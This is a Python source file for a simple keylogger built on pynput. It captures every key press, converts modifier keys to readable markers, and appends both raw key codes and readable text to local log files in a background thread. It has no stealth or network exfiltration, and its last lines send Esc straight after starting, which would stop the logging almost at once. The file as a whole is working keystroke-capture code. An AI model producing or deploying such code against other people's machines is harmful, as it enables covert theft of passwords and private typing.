from pynput.keyboard import Key, Listener, Controller
import threading
import os


class Keylogger:
    def __init__(self):
        # Dictionary containing all the keys
        # which may not produce a visible output in the log,
        # but still need recording
        self.modifier_keys = {
            "Key.enter": '\n',
            "Key.space": ' ',
            "Key.shift_l": '',
            "Key.shift_r": '',
            "Key.tab": "[TAB]",
            "Key.backspace": "[BACKSPACE]",
            "Key.caps_lock": "[CAPSLOCK]",
            "Key.ctrl": "[CTRL]"
        }
        self.standardkey = True

        # Make a folder to store the logs,
        # if the folder already exists continue
        try:
            os.mkdir('./logs')
        except FileExistsError:
            pass

    # When a key is pressed on keyboard
    def key_press(self, key):
        
        
        # ESCAPE CLAUSE
        if key == Key.esc:
            print("ESCAPED: ")
            input()
            return False

        with open('./logs/readable.txt', 'a+') as log, open('./logs/keycodes.txt', 'a+') as codes:

            # key codes
            # This produces an output unreadable to humans
            print("added code: " + str(key))
            codes.write(str(key) + '\n')

            # readable keys
            for keycode in self.modifier_keys:
                if keycode == str(key):
                    self.standardkey = False
                    log.write(self.modifier_keys[keycode])
                    break
            if self.standardkey:
                log.write(str(key).replace("'", ""))
            self.standardkey = True

    def log(self):
           with Listener(on_press=self.key_press) as listener:
            listener.join()  # listening for keystrokes


start = Keylogger()
kThread = threading.Thread(target=start.log)
kThread.start()

keyboard = Controller()
keyboard.press(Key.esc)
keyboard.release(Key.esc)



